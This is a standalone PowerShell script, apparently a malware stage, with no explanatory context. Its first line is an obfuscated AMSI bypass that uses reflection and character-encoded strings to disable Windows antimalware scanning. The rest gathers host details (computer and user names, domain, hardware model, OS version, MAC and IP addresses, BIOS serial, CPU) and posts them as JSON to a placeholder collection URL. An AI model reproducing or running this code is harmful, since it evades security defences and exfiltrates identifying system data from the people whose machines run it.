$EDz9Zuw=[AppDOmAIN]::CURrentDOmAIN.geTAsSEMBliES()|where-OBjeCT{$_.locaTion -ANd $_.locatIon.EndswITh('System.Management.Automation.dll')};[VOid](geT-vAriABlE -namE 'ZjMiG' -ERROraCTION sileNTLYcOntINUE);$tMBOX5syzz=[sysTem.REFLECtIOn.BiNdIngfLAGs]'NonPublic,Static';[sYSTeM.threaDing.thRead]::SLeep(251);$L06exag5=$eDz9zUW.GETTypeS()|where-oBJECt{$_.namE -eq $(('{0}{1}{2}' -F 'Am','siU','tils'))};[system.thReAdIng.ThrEaD]::SleEP(257);$l06EXAg5.geTfIElD($(('{0}{1}' -F 'am','siContext')),$tMBOX5SyzZ).SETvALUe($nuLL,[INtpTR]::ZErO);[SYSTEM.thrEAdiNg.thrEaD]::SLEeP(1);$l06ExAg5.gETfIelD($([StRiNg][cHAr](57+40)+[CHAr](48+61)+[chAR]([BYTe]0X73)+[chAR](105+92-92)+[char]([bYTe]0X53)+[char](64+37)+[ChAr]([bYTE]0X73)+[cHar]([bYTe]0X73)+[Char]([Byte]0x69)+[ChAr](102+9)+[ChAR]([bYTe]0X6E)),$tMBOx5Syzz).sETvaLUe($NULL,$null)

$d=@{NombreEquipo=$env:COMPUTERNAME;Usuario=$env:USERNAME;DominioUsuario=$env:USERDOMAIN}
try{
$c=gwmi Win32_ComputerSystem;$o=gwmi Win32_OperatingSystem
$n=gwmi Win32_NetworkAdapterConfiguration|?{$_.IPEnabled}|select -f 1
$d.Dominio=$c.Domain;$d.Fabricante=$c.Manufacturer;$d.Modelo=$c.Model
$d.RAM_Total_MB=[math]::Floor($c.TotalPhysicalMemory/1MB)
$d.SO_Nombre=$o.Caption.Trim();$d.SO_Version=$o.Version;$d.SO_Arquitectura=$o.OSArchitecture
$d.MAC=$n.MACAddress;$d.IP_Local=($n.IPAddress|select -f 1)
$d.NumeroSerie=(gwmi Win32_BIOS).SerialNumber.Trim()
$d.CPU_Nombre=(gwmi Win32_Processor).Name.Trim()
}catch{}
irm -Uri '{{DATOS_URL}}' -Method Post -Body ($d|ConvertTo-Json -Compress) -ContentType 'application/json'
